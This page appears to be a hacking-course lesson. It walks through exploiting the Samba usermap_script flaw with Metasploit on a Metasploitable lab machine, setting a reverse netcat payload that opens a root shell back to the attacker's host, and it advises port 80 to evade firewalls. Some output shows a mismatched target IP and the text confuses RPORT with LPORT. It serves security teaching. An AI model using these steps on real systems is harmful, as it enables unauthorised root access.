---
title: Exploiting a Code Execution Vulnerability to Hack into a Remote Server
type: default
layout: page
child: Cracking
fold: Computer Cracking
---

So far we have seen how we can use a service that has not been configured
correctly or a service that came with a backdoor to gain full access to the
target computer. We have also seen the basic use of Metasploit to connect to a
backdoor that was installed on the FTP service.

In this lesson, we are going to have a more advanced look on Metasploit and we
will see how we can use it to exploit a vulnerability that exists in a certain
service, in this case, a code execution vulnerability which will give us full
access to the target computer as well.

Back to our results with Nmap (shown in previous lessons), we are going to do
the same thing we have been doing for a while, we copy the service name and see
if it has any vulnerabilities. For this lesson, we are going to be focusing on
the port 139, which has a Samba server version 3.X, we are going to go to the
internet and search this service name up just like we did in the previous
videos, we are going to search the name of the service, followed by the word
exploit the term we are going to be using would look like _samba 3.x exploit_.

As you can probably see, there is a number of results, the one that we are
interested in is the one of the Rapid7 website because, as I said, these are the
people that are behind Metasploit, so the exploits that you see there can be
used through Metasploit.

We have two examples in the results page, I have tried both and only got
successful results by using the _Samba "username map script" Command Execution_,
so there is a bit of trial and error, the one we are going to be using is a
command execution vulnerability as you can see in the title, so let's click in
that result so we can get more information.

Once we are in the Rapid7's website, we can see that the name of the
vulnerability is _exploit/multi/samba/usermap_script_ so we are going to use
this the same way we did it before with the evil backdoor in the FTP service.

Now, let's open up a terminal and type `msfconsole` to open Metasploit, we are
going to execute _use_ as we did before with the name of the Samba
vulnerability, the final command would look like this:

```bash
use exploit/multi/samba/usermap_script
```

The next thing that we usually do is `show options` to see the options of this
particular exploit. Using these exploits is always pretty much the same, the
only difference is the options that you can set for each exploit, you always do
use to choose an exploit and then you execute `show options` to see what you can
change to work with this exploit. The output of `show options` for this Samba
exploit is:

```bash
Module options (exploit/multi/samba/usermap_script):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  139              yes       The target port

Exploit target:

  Id  Name
  --  ----
  0   Automatic
```

Again, we need to set up the RHOST which is the IP of the target computer and we
are going to do it the same way that we did before, setting the options is
always the same, just type set, the option name and the desired value for that
option, in this case, if I wanted to set the RHOST value to _192.168.1.12_ which
is the IP address of my Metasploitable machine, I'd just have to run:

```bash
set RHOST 192.168.1.12
```

Now, let's execute show options again:

```bash
Module options (exploit/multi/samba/usermap_script):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST  192.168.1.12     yes       The target address
  RPORT  139              yes       The target port

Exploit target:

  Id  Name
  --  ----
  0   Automatic
```

As you can see now, the RHOST option has been set correctly. What we need to do
now is, here is where things differ from the previous lesson. In the previous
lecture we used a backdoor that was already installed on the target computer so
all we had to do is connect to the backdoor and then we could run any commands,
on the target computer. In the situation presented in this lesson, the target
computer does not have a backdoor, it has a normal program that has a buffer
overflow overflow or a code execution vulnerability so, the program doesn't have
any code that allow us to run commands, it has certain flaw that will let us run
a small piece of code, these small pieces of code are called payloads. What we
need to do is to create payload and then run it on the target computer using the
vulnerability that we found, that piece of code will allow us to do different
things, the payload is what will let us do things that might be useful for us,
for example, execute commands and there is other type of payloads we will look
at in the future.

To see the payloads that you can use with this particular exploit, all you have
to do is to execute:

```bash
show payloads
```

And you would get an output like the following:

```bash
Compatible Payloads
===================

   #   Name                                Disclosure Date  Rank    Check  Description
   -   ----                                ---------------  ----    -----  -----------
   0   cmd/unix/bind_awk                                    normal  No     Unix Command Shell, Bind TCP (via AWK)
   1   cmd/unix/bind_busybox_telnetd                        normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)
   2   cmd/unix/bind_inetd                                  normal  No     Unix Command Shell, Bind TCP (inetd)
   3   cmd/unix/bind_jjs                                    normal  No     Unix Command Shell, Bind TCP (via jjs)
   4   cmd/unix/bind_lua                                    normal  No     Unix Command Shell, Bind TCP (via Lua)
   5   cmd/unix/bind_netcat                                 normal  No     Unix Command Shell, Bind TCP (via netcat)
   6   cmd/unix/bind_netcat_gaping                          normal  No     Unix Command Shell, Bind TCP (via netcat -e)
   7   cmd/unix/bind_netcat_gaping_ipv6                     normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6
   8   cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   9   cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   10  cmd/unix/bind_r                                      normal  No     Unix Command Shell, Bind TCP (via R)
   11  cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   12  cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   13  cmd/unix/bind_socat_udp                              normal  No     Unix Command Shell, Bind UDP (via socat)
   14  cmd/unix/bind_zsh                                    normal  No     Unix Command Shell, Bind TCP (via Zsh)
   15  cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   16  cmd/unix/pingback_bind                               normal  No     Unix Command Shell, Pingback Bind TCP (via netcat)
   17  cmd/unix/pingback_reverse                            normal  No     Unix Command Shell, Pingback Reverse TCP (via netcat)
   18  cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   19  cmd/unix/reverse_awk                                 normal  No     Unix Command Shell, Reverse TCP (via AWK)
   20  cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   21  cmd/unix/reverse_jjs                                 normal  No     Unix Command Shell, Reverse TCP (via jjs)
   22  cmd/unix/reverse_ksh                                 normal  No     Unix Command Shell, Reverse TCP (via Ksh)
   23  cmd/unix/reverse_lua                                 normal  No     Unix Command Shell, Reverse TCP (via Lua)
   24  cmd/unix/reverse_ncat_ssl                            normal  No     Unix Command Shell, Reverse TCP (via ncat)
   25  cmd/unix/reverse_netcat                              normal  No     Unix Command Shell, Reverse TCP (via netcat)
   26  cmd/unix/reverse_netcat_gaping                       normal  No     Unix Command Shell, Reverse TCP (via netcat -e)
   27  cmd/unix/reverse_openssl                             normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
   28  cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   29  cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   30  cmd/unix/reverse_php_ssl                             normal  No     Unix Command Shell, Reverse TCP SSL (via php)
   31  cmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)
   32  cmd/unix/reverse_python_ssl                          normal  No     Unix Command Shell, Reverse TCP SSL (via python)
   33  cmd/unix/reverse_r                                   normal  No     Unix Command Shell, Reverse TCP (via R)
   34  cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   35  cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   36  cmd/unix/reverse_socat_udp                           normal  No     Unix Command Shell, Reverse UDP (via socat)
   37  cmd/unix/reverse_ssh                                 normal  No     Unix Command Shell, Reverse TCP SSH
   38  cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
   39  cmd/unix/reverse_tclsh                               normal  No     Unix Command Shell, Reverse TCP (via Tclsh)
   40  cmd/unix/reverse_zsh                                 normal  No     Unix Command Shell, Reverse TCP (via Zsh)

```

And those are the different type of payloads that you can use, remember,
payloads are small pieces of code that will be executed on the target computer
once the vulnerability has been exploited. So, when we exploit the
vulnerability, the code that we are going to pick here will be executed, and
depending on the type of the payload we choose, that payload will do something
that is useful to us. Right now, you can see that all the payloads start with
`cmd`, that is a short for command, so those payloads will let us run commands
on our target computer like if we are executing Linux commands. All of them only
run on Unix and that's okay because our target is Linux, and there are two main
types: bind payloads and there are reverse payloads.

The bind payloads, all they do is open a port on the target computer and then we
connect to that port. The reverse payloads, they do the opposite. They will open
a port in our machine and then they connect from the target computer to my
machine, this is useful, because the reverse allow us to bypass firewalls. So,
the firewall will filter any connections going to the target machine, but if the
target machine connects to me and I don't have a firewall then I will be able to
bypass the firewall.

So, the payload I am going to be using is `cmd/unix/reverse_netcat`. The last
part of these payloads are the program and the language or tool that is going to
be used to facilitate the connection. For example, we can see that there are
payloads written in perl, ruby, python, PHP or that use netcat which is a tool
that allows connections between computers.

To use a payload, you do it almost the same way you set an option, for
example, to specify the payload `cmd/unix/reverse_netcat` (which is the one I am
going to be using) I'd just issue the command:

```bash
set PAYLOAD cmd/unix/reverse_netcat
```

Now, I am going to do a show options to see if there is any other options that I
need to set.

```bash
Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.20.14.204     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

As you can see, as we picked a payload there are more options, there is an
option called LHOST and it is the listening address that is my own address, my
machine's IP address.

So, to get our own IP address, we are going to use `ifconfig`:

```bash
enp1s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.5  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 2800:e2:1380:aba:4eed:fbff:fe03:4301  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::4eed:fbff:fe03:4301  prefixlen 64  scopeid 0x20<link>
        ether 4c:ed:fb:03:43:01  txqueuelen 1000  (Ethernet)
        RX packets 3037766  bytes 4475498409 (4.1 GiB)
        RX errors 0  dropped 9043  overruns 0  frame 0
        TX packets 1841782  bytes 128497947 (122.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

And as you can see, my IP address is `192.168.1.5` so that is going to be the
value of LHOST. To set the value of LHOST, we are going to do it the same way we
did it with RHOST before:

```bash
set LHOST 192.168.1.5
```

If we execute `show options` again, we will see that all the values are set now.
You can modify the value `RPORT` to modify the port that you are going to be
listening on, in your computer, you can set it to `80` if you wanted to, that is
the port that is used by web browsers, so if you set the `LPORT` value to 80,
the target computer will try to connect to you using port 80 which is never
filtered on firewalls because that is the port that web browsers use by default.
So, if you set your listening port to 80 and the target computer connects to
your machine on that port, the target's firewall will think they are simply
browsing the internet.

Now, you can execute `exploit` to run the exploit.

```bash
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Command shell session 1 opened (192.168.1.5:4444 -> 192.168.1.12:60370) at 2021-05-05 20:16:15 +0000
```

As you can see, it is telling me that session one has been opened and the
connection is between our target and our computer. Now, we can execute normal
linux commands and they are going to be executed in our target machine. For
example:

```bash
pwd
/
id
uid=0(root) gid=0(root)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
src
sys
tmp
usr
var
vmlinuz
```
